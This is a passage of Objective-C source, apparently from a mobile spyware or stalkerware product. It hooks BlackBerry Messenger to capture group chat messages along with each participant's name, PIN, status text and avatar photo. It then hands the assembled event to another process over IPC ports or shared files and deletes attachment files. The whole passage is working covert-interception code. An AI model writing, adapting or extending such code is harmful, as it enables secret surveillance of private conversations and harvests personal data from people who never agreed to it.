	for (int i=0; i<[multipleConversations count]; i++) {
        BBGGroupConversation *gConversation = [multipleConversations objectAtIndex:i];
        if ([aGroupUri isEqualToString:[gConversation conversationUri]]) {
            imEvent = [[[FxIMEvent alloc] init] autorelease];
            
            convName = [gConversation conversationTitle];
            convID = [gConversation conversationUri];
            
            BBGGroup *group = [gConversation resolvedGroupUri];
            BBMLiveList *memberList = [aBBMCoreAccessGroup getMembersForGroupURI:[group getUri]];
            
            NSInteger breaker = 0;
            while ([memberList count] == 0 && breaker < 3) {
                [NSThread sleepForTimeInterval:2.0];
                memberList = [aBBMCoreAccessGroup getMembersForGroupURI:[group getUri]];
                breaker++;
            }
            
//            DLog(@"Group, group members: %@, %@", group, memberList);
//            DLog(@"objects = %@", [memberList objects]);
//            DLog(@"receivedElements = %@", [memberList receivedElements]);
//            DLog(@"array = %@", [memberList array]);
//            DLog(@"observableArray = %@", [memberList observableArray]);
//            DLog(@"request = %@", [memberList request]);
//            DLog(@"parentKey = %@", [memberList parentKey]);
            
            
            NSMutableArray *participants = [[NSMutableArray alloc] init];
            
            listOfResolvedParticipants = [[NSArray alloc] initWithArray:[memberList objects]];
            
            BBMUser * user = [bbmCoreAccess currentUser];
            NSString *localPin = [bbmCoreAccess localPin];
            localPin = [localPin lowercaseString];
            DLog(@"user = %@", user);
            DLog(@"User pin = %@", [user getPin]);
            DLog(@"currentUserPins = %@", [bbmCoreAccess currentUserPins]);
            DLog(@"localPin = %@", [bbmCoreAccess localPin]); // Sometime found in this line: Job appears to have crashed: Segmentation fault: 11
            DLog(@"localBbid = %@", [bbmCoreAccess localBbid]);
            
            for (int i =0; i<[listOfResolvedParticipants count]; i++) {
                BBGGroupMember * member = [listOfResolvedParticipants objectAtIndex:i];
                BBGGroupContact *gContact = [member groupContact];
                
                DLog(@"======================== %d",i);
                DLog(@"memberPin: %@",[gContact getPin]);
                DLog(@"memberID: %@",[gContact getUri]);
                DLog(@"memberName: %@",[gContact getDisplayName]);
                DLog(@"memberCellMainText: %@",[gContact cellMainText]);
                DLog(@"memberAvatarImagePath: %@",[gContact avatarImagePath]);
                
                if ([[gContact getUri] isEqualToString:aSenderUri]) {
                    senderName = [gContact getDisplayName];
                    senderID = [gContact getUri];
                    senderStatus = [gContact cellMainText];
                    senderPhoto = [NSData dataWithContentsOfFile:[gContact avatarImagePath]];
                } else {
                    /*
                     - First time when BBM launched some contacts did not fully loaded thus this lead to contact name is (null) when we
                     captured first group message (incoming only) but these contact names will replace correctly later on
                     
                     - Even contact name is null the contact id captured correcty
                     */
                    NSString *gUri = [[gContact getUri] lowercaseString];
                    NSString *gPin = [[gContact getPin] lowercaseString];
                    
                    FxRecipient *participant = [[FxRecipient alloc] init];
                    [participant setRecipNumAddr:[gContact getUri]];
                    [participant setMPicture:[NSData dataWithContentsOfFile:[gContact avatarImagePath]]];
                    [participant setRecipContactName:[gContact getDisplayName]];
                    [participant setMStatusMessage:[gContact cellDetailText]];
                    if ([gPin isEqualToString:localPin] ||
                        [gUri rangeOfString:localPin].location != NSNotFound) {
                        [participants insertObject:participant atIndex:0];
                    } else {
                        [participants addObject:participant];
                    }
                    [participant release];
                }
            }
            
            DLog(@"Type : Uknown | Direction : %d", direction);
            DLog(@"ConversationID: %@",convID);
            DLog(@"ConversationName %@",convName);
            DLog(@"senderID: %@",senderID);
            DLog(@"senderName: %@",senderName);
            DLog(@"senderStatus: %@",senderStatus);
            DLog(@"senderPhoto: %llu", (unsigned long long)[senderPhoto length]);
             
            [imEvent setMDirection:direction];
            [imEvent setMRepresentationOfMessage:kIMMessageNone];
            [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [imEvent setMIMServiceID:imServiceID];
            [imEvent setMServiceID:kIMServiceBBM];
            [imEvent setMUserID:senderID];
            [imEvent setMUserDisplayName:senderName];
            [imEvent setMUserStatusMessage:senderStatus];
            [imEvent setMUserPicture:senderPhoto];
            [imEvent setMParticipants:participants];
            [imEvent setMConversationID:convID];
            [imEvent setMConversationName:convName];
            [imEvent setMConversationPicture:convPhoto];
            [imEvent setMMessage:message];
            [imEvent setMAttachments:nil];
            
            [listOfResolvedParticipants release];
            [participants release];
            break;
        }

	}
    return (imEvent);
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender = nil;
        if ([aPortName isEqualToString:kBBMMessagePort]) {
            sharedFileSender = [[BBMUtils sharedBBMUtils] mIMSharedFileSender];
        } else if ([aPortName isEqualToString:kBBMMessagePort1]) {
            sharedFileSender = [[BBMUtils sharedBBMUtils] mIMSharedFileSender1];
        } else if ([aPortName isEqualToString:kBBMMessagePort2]) {
            sharedFileSender = [[BBMUtils sharedBBMUtils] mIMSharedFileSender2];
        }
        
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
		
	}
}

@end
